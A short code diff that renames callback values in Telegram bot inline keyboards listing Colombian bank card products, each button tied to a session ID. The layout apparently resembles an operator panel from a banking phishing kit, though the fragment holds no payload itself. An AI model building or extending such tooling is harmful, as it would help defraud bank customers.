@@ -52,7 +52,7 @@ function getPrimaryReplyMarkup(sessionId) {
                 { text: "🪙 Visa Oro", callback_data: `go:Visa+Oro|${sessionId}` }
             ],
             [
-                { text: "💍 Master Clásica", callback_data: `go:Mastercard+Clasica|${sessionId}` },
+                { text: "💍 Master Clásica", callback_data: `go:Mastercard+Clasica+Tradicional|${sessionId}` },
                 { text: "🌐 Virtual", callback_data: `go:virtualdedbit|${sessionId}` }
             ],
             [
@@ -72,15 +72,15 @@ function getSecondaryReplyMarkup(sessionId) {
     return {
         inline_keyboard: [
             [
-                { text: "💍 Visa Clásica", callback_data: `go:Visa+clasica|${sessionId}` },
+                { text: "💍 Visa Clásica", callback_data: `go:+Visa+clasica+tradicional|${sessionId}` },
                 { text: "🖤 Visa Infinite", callback_data: `go:Infinite_Card|${sessionId}` }
             ],
             [
-                { text: "🩶 Visa Platinum", callback_data: `go:Visa+Platinum|${sessionId}` },
-                { text: "⚽ Visa Selección", callback_data: `go:Visa+Seleccion|${sessionId}` }
+                { text: "🩶 Visa Platinum", callback_data: `go:Visa+Platinum+Conavi|${sessionId}` },
+                { text: "⚽ Visa Selección", callback_data: `go:Visa+Seleccion+Colombia|${sessionId}` }
             ],
             [
-                { text: "🛩️ Visa LifeMiles", callback_data: `go:Visa+LifeMiles|${sessionId}` },
+                { text: "🛩️ Visa LifeMiles", callback_data: `go:BC_VISA_LIFEMILE_PERSONAS_BC_VISA_LIFEMILE_PERSONAS_TIRO_|${sessionId}` },
                 { text: "🪙 MasterCard Gold", callback_data: `go:mastergold|${sessionId}` }
             ],
             [
